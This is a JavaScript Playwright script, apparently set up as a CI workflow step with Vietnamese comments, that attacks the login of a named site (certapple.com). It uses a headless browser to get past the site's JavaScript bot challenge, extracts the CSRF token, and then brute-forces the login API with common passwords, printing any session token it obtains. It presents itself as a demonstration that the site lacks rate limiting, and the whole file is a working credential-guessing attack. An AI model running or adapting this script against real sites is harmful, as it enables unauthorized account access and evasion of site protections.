
// attack_script.js

const { chromium } = require('playwright');

// --- Cấu hình ---
const TARGET_URL = 'https://certapple.com';
const LOGIN_API_URL = `${TARGET_URL}/login_post`;
const EMAIL_TEST = 'attacker@test.com';
const PASSWORDS = ["123456", "password", "admin", "123123", "qwerty", "certapple"];
// --- Kết thúc cấu hình ---

(async () => {
  console.log('::group::Khởi chạy trình duyệt headless (Chrome) để vượt qua lớp bảo vệ JavaScript...');
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();
  console.log('Trình duyệt đã sẵn sàng.');
  console.log('::endgroup::');

  try {
    // Bước 1: Truy cập trang chủ để trình duyệt giải quyết JavaScript challenge
    console.log(`::group::Truy cập ${TARGET_URL} để lấy cookie và CSRF token...`);
    await page.goto(TARGET_URL, { waitUntil: 'networkidle' }); // Chờ cho đến khi trang tải xong hoàn toàn
    console.log('✅ Vượt qua lớp bảo vệ JavaScript thành công!');

    // Bước 2: Lấy CSRF token từ trang đã được tải đầy đủ
    const csrfToken = await page.locator('meta[name="csrf-token"]').getAttribute('content');
    if (!csrfToken) {
      console.error('::error::Không thể lấy được CSRF token sau khi đã tải trang bằng Playwright.');
      process.exit(1);
    }
    console.log(`✅ Lấy được CSRF Token: ${csrfToken}`);
    console.log('::endgroup::');

    // Bước 3: Bắt đầu vòng lặp tấn công Brute-Force
    console.log('::group::Bắt đầu mô phỏng tấn công Brute-Force vào API...');
    console.log(`Sẽ thử tấn công với email '${EMAIL_TEST}' và danh sách ${PASSWORDS.length} mật khẩu.`);

    for (const pass of PASSWORDS) {
      console.log('------------------------------------');
      console.log(`Đang thử mật khẩu: ${pass}`);

      // Sử dụng page.request để gửi POST, nó sẽ tự động đính kèm cookie đã có
      const response = await page.request.post(LOGIN_API_URL, {
        form: {
          email: EMAIL_TEST,
          password: pass,
          _token: csrfToken,
        }
      });

      const jsonResponse = await response.json();

      if (jsonResponse.status === 'success' && jsonResponse.token_key) {
        console.error(`::error::TẤN CÔNG THÀNH CÔNG! Mật khẩu '${pass}' là ĐÚNG hoặc server xử lý lỗi sai!`);
        console.error(`Server đã trả về token: ${jsonResponse.token_key}`);
        process.exit(1); // Thoát với mã lỗi để báo hiệu workflow thất bại (tấn công thành công)
      } else {
        console.log(`Thất bại. Server phản hồi: ${jsonResponse.message}`);
      }
    }
    console.log('------------------------------------');
    console.log('✅ Hoàn thành demo tấn công. Việc server phản hồi liên tục cho thấy KHÔNG có cơ chế Rate Limiting.');
    console.log('::endgroup::');

  } catch (error) {
    console.error('::error::Đã xảy ra lỗi trong quá trình tấn công:', error);
    process.exit(1);
  } finally {
    await browser.close();
  }
})();

